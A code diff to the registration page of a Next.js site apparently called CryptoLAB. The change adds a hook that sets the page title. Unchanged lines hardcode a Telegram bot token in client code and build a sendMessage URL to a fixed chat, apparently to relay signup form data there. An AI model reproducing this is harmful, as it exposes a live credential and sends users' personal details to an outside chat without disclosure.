@@ -1,5 +1,5 @@
 import {useRouter} from 'next/router'
-import {useState} from 'react'
+import {useEffect, useState} from 'react'
 import AlertToast from '../../components/AlertToast/AlertToast'
 import styles from './Register.module.scss'
 
@@ -11,11 +11,15 @@ const API_KEY = '5953195869:AAFPjedXZy9x3Pa9BwXWFRa7g_v1ndLK6HM'
 const API_URL = `https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=-819106547&parse_mode=Markdown&text=`
 
 const Register = () => {
+
+    useEffect(() => {
+        document.title = "Register | CryptoLAB"
+    }, [])
+
     const router = useRouter()
 
     const [error,
         setError] = useState(false)
-
     const [firstName,
         setFirstName] = useState('')
     const [lastName,
